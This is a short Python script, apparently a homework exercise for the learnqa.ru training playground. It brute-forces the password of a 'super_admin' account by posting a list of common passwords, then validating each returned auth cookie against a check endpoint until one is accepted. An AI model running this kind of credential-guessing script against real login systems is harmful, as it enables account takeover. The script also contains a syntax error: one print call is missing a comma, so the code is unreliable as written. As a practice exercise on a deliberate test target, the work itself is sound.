import requests

url_get = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
             "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "654321", "555555", "lovely", "7777777",
             "welcome", "888888", "princess", "dragon", "password1", "123qwe", "qwertyuiop"]

for password in passwords:
    payload = {"login": "super_admin", "password": password}
    response = requests.post(url=url_get, data=payload)
    cookie_value = response.cookies.get("auth_cookie")
    check_auth_cookie = requests.get(url=url_check, cookies={"auth_cookie": cookie_value})
    check_result = check_auth_cookie.text

    if check_result == "You are NOT authorized":
        print("The password" password, "is incorrect")
        continue

    else:
        print("CORRECT password is ", password, " ; ", check_result)
        break


